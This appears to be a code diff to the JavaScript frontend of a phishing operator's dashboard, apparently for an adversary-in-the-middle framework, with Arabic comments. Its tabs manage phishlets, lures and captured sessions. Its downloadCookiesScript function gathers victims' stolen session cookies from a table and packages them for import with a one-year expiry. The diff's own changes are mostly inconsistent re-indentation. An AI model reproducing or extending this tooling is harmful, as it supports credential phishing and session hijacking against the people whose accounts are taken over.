@@ -1094,7 +1094,7 @@ function populateSessionsTable(sessions) {
             // تنزيل الكوكيز مباشرة بدلاً من عرض النافذة المنبثقة
             try {
                 // الحصول على تفاصيل الجلسة أولاً للحصول على الكوكيز
-                const sessionData = await fetchSessionDetails(id);
+        const sessionData = await fetchSessionDetails(id);
                 console.log('Session data for cookies:', sessionData);
                 
                 // إضافة تحقق من وجود بيانات الجلسة
@@ -1108,10 +1108,10 @@ function populateSessionsTable(sessions) {
                 
                 // إنشاء سكريبت الكوكيز
                 downloadCookiesScript(sessionData);
-            } catch (error) {
-                console.error('Error fetching session details:', error);
-                showToast('Error', 'Failed to load session details', 'error');
-            }
+    } catch (error) {
+        console.error('Error fetching session details:', error);
+        showToast('Error', 'Failed to load session details', 'error');
+    }
         });
     });
 }
@@ -1356,7 +1356,7 @@ async function updateCertificates() {
 // Initialize the dashboard when DOM is loaded
 document.addEventListener('DOMContentLoaded', () => {
     checkAuthentication();
-    setupEventListeners();
+            setupEventListeners();
     initTypewriterEffect();
     initWorldMap(); // تهيئة الخريطة التفاعلية
     updateDashboard();
@@ -1435,10 +1435,10 @@ function setupEventListeners() {
             const tabName = targetId.replace('-tab', '');
             switch(tabName) {
                 case 'phishlets':
-                    fetchPhishlets().then(populatePhishletsTable);
+                fetchPhishlets().then(populatePhishletsTable);
                     break;
                 case 'lures':
-                    fetchLures().then(populateLuresTable);
+                fetchLures().then(populateLuresTable);
                     break;
                 case 'sessions':
                     fetchSessions().then(populateSessionsTable);
@@ -1546,7 +1546,7 @@ function downloadCookiesScript(sessionData) {
             showToast('Warning', 'No cookies found for this session', 'warning');
             
             // قد نستخدم الطريقة القديمة للحصول على الكوكيز من الجدول
-            const cookiesTable = document.getElementById('cookies-table');
+    const cookiesTable = document.getElementById('cookies-table');
             if (cookiesTable) {
                 const rows = cookiesTable.querySelectorAll('tbody tr');
                 
@@ -1574,20 +1574,20 @@ function downloadCookiesScript(sessionData) {
         // استخدام الطريقة القديمة للحصول على الكوكيز من الجدول إذا لم تتوفر بيانات الجلسة
         const cookiesTable = document.getElementById('cookies-table');
         if (cookiesTable) {
-            const rows = cookiesTable.querySelectorAll('tbody tr');
-            
-            // التحقق من وجود كوكيز
-            if (rows.length === 0 || (rows.length === 1 && rows[0].cells.length === 1)) {
+    const rows = cookiesTable.querySelectorAll('tbody tr');
+    
+    // التحقق من وجود كوكيز
+    if (rows.length === 0 || (rows.length === 1 && rows[0].cells.length === 1)) {
                 showToast('Error', 'No cookies found for this session', 'error');
-                return;
-            }
-            
-            rows.forEach(row => {
-                // تجاوز الصفوف التي تحتوي على رسائل (مثل "No cookies available")
-                if (row.cells.length === 1) return;
-                
-                cookies.push({
-                    name: row.cells[1].textContent,
+        return;
+    }
+    
+    rows.forEach(row => {
+        // تجاوز الصفوف التي تحتوي على رسائل (مثل "No cookies available")
+        if (row.cells.length === 1) return;
+        
+        cookies.push({
+            name: row.cells[1].textContent,
                     value: row.cells[2].textContent,
                     domain: row.cells[0].textContent,
                     expirationDate: Date.now() + 31536000000, // سنة واحدة من الآن
@@ -1598,8 +1598,8 @@ function downloadCookiesScript(sessionData) {
                     secure: true,
                     session: true,
                     storeId: null
-                });
-            });
+        });
+    });
         }
     }
     
